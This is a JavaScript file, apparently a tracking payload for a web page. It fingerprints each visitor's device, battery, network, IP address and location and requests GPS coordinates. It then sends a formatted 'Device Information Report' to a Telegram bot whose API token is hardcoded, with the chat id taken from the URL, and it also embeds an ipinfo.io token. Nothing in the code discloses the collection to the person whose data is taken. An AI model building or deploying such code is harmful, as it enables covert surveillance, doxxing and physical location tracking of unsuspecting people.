// submit.js (updated: GPS, adblock, IP note placement)

async function collectAndSend(chatId) {
  if (!chatId) {
    console.warn('No chat id provided in URL.');
    return;
  }

  const safe = (fn, fallback = 'Unknown') => {
    try { const v = fn(); return (v === undefined || v === null) ? fallback : v; } catch { return fallback; }
  };

  // Basic / locale / browser
  const ua = navigator.userAgent || 'Unknown';
  const browser = (() => {
    const u = ua.toLowerCase();
    if (u.includes('edg/')) return 'Edge';
    if (u.includes('opr/') || u.includes('opera')) return 'Opera';
    if (u.includes('chrome') && !u.includes('chromium') && !u.includes('edg/')) return 'Chrome';
    if (u.includes('firefox')) return 'Firefox';
    if (u.includes('safari') && !u.includes('chrome')) return 'Safari';
    return ua;
  })();

  const platform = safe(() => navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform), 'Unknown');
  const language = safe(() => navigator.language || (navigator.languages && navigator.languages[0]), 'Unknown');
  const timezone = safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, 'Unknown');

  // Hardware
  const cpuCores = safe(() => navigator.hardwareConcurrency, 'Unknown');
  const ram = safe(() => (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'));

  // Screen
  const resolution = safe(() => `${window.screen.width}x${window.screen.height}`, 'Unknown');
  const colorDepth = safe(() => `${window.screen.colorDepth}-bit`, 'Unknown');

  // WebGL info
  let webglVendor = 'Unknown', webglRenderer = 'Unknown';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || 'Unknown';
        webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || 'Unknown';
      } else {
        webglRenderer = gl.getParameter(gl.RENDERER) || 'Unknown';
      }
    }
  } catch (e) {}

  // Battery
  let batteryLevel = 'Unknown', batteryCharging = 'Unknown';
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      batteryLevel = (typeof b.level === 'number') ? Math.round(b.level * 100) + '%' : 'Unknown';
      batteryCharging = (typeof b.charging === 'boolean') ? (b.charging ? 'Yes' : 'No') : 'Unknown';
    }
  } catch (e) {}

  // Network info (navigator.connection)
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
  const netType = connection ? (connection.effectiveType || 'Unknown') : 'Unknown';
  const downlink = connection ? (connection.downlink ? connection.downlink + ' Mbps' : 'Unknown') : 'Unknown';
  const rtt = connection ? (connection.rtt ? Math.round(connection.rtt) + ' ms' : 'Unknown') : 'Unknown';
  const saveData = connection ? (connection.saveData ? 'Enabled' : 'Disabled') : 'Unknown';

  // Adblock detection (DOM bait + fetch)
  async function detectAdblock() {
    try {
      const bait = document.createElement('div');
      bait.className = 'adsbox ad-banner adsbygoogle adunit';
      bait.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;top:-9999px';
      document.body.appendChild(bait);
      await new Promise(r => setTimeout(r, 60));
      const isHidden = (bait.offsetParent === null || bait.offsetHeight === 0 || bait.clientHeight === 0 || getComputedStyle(bait).display === 'none');
      bait.remove();
      if (isHidden) return 'Positive';
    } catch {}
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 2500);
      await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'GET', mode: 'no-cors', signal: controller.signal });
      clearTimeout(timeout);
      return 'Negative';
    } catch {
      return 'Positive';
    }
  }

  // Geolocation
  async function getGeolocation() {
    let status = 'Denied', latitude = 'Denied', longitude = 'Denied';
    const getPos = (timeoutMs = 8000) => new Promise((resolve, reject) => {
      let done = false;
      navigator.geolocation.getCurrentPosition(p => { if (!done) { done = true; resolve(p); } },
                                              e => { if (!done) { done = true; reject(e); } },
                                              { enableHighAccuracy: false, maximumAge: 60000, timeout: timeoutMs });
      setTimeout(() => { if (!done) { done = true; reject(new Error('timeout')); } }, timeoutMs + 200);
    });
    try {
      const p = await getPos();
      status = 'Allowed';
      latitude = p.coords.latitude;
      longitude = p.coords.longitude;
    } catch (err) {
      status = (err && err.code === err.PERMISSION_DENIED) ? 'Denied' : 'Unavailable';
    }
    return { status, latitude, longitude };
  }

  const [adblockResult, geoResult] = await Promise.all([ detectAdblock(), getGeolocation() ]);

  // IP info
  let ip='Unknown', city='Unknown', region='Unknown', country='Unknown', org='Unknown';
  try {
    const res = await fetch('https://ipinfo.io/json?token=18d2a866939a58');
    if (res.ok) {
      const d = await res.json();
      ip = d.ip || ip;
      city = d.city || city;
      region = d.region || region;
      country = d.country || country;
      org = d.org || org;
    }
  } catch (e) {}

  const message = 
`🔰 Device Information Report 🔰

🌐 Basic Info:
- Browser: ${browser}
- Platform: ${platform}
- Language: ${language}
- Timezone: ${timezone}

💻 Hardware:
- CPU: ${cpuCores} cores
- RAM: ${ram}
- Screen: ${resolution}, ${colorDepth}
- WebGL: ${webglRenderer} (${webglVendor})

📶 Network:
- Type: ${netType}
- Speed: ${downlink}
- Latency: ${rtt}
- Data Saver: ${saveData}
- ISP: ${org || 'Unknown'}

📍 IP Info:
- IP: ${ip}
*Note: IP-based location may not be accurate.*
- City: ${city}
- Region: ${region}
- Country: ${country}

📌 GPS:
- Status: ${geoResult.status}
- Latitude: ${geoResult.latitude}
- Longitude: ${geoResult.longitude}

🛡️ Adblocker: ${adblockResult}

🔋 Battery:
- Level: ${batteryLevel}
- Charging: ${batteryCharging}
`;

  const token = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
  const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    await fetch(tgUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
  } catch (err) {
    console.error('Telegram send error', err);
  }
}
